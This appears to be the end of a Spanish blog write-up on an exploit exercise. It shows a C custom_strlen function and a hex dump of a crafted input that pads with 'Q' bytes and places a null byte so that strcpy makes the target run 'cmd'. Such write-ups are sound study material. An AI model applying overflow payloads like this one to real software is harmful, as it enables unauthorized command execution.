+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="nf">custom_strlen</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">str</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">len</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">str</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="exploit">Exploit</h4>
+<p>En vez de ejecutar la calculadora ejecuté cmd porque estoy bajo linux y wine no tiene calc. Tuve que poner un 00 en la posición 17 porque strcpy copia hasta encontrar un <code>00</code> y así <code>18+38=56</code> 38 es la longitud de <code>A ejecutar la calculadora de nuevo...\n</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000: 3051 5151 5151 5151 5151 5151 5151 5151  0QQQQQQQQQQQQQQQ
+</span></span><span class="line"><span class="cl">00000010: 5151 0051 5151 5151 5151 5151 5151 636d  QQ.QQQQQQQQQQQcm
+</span></span><span class="line"><span class="cl">00000020: 6400                                     d.
+</span></span></code></pre></div></div></div><footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 Index</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
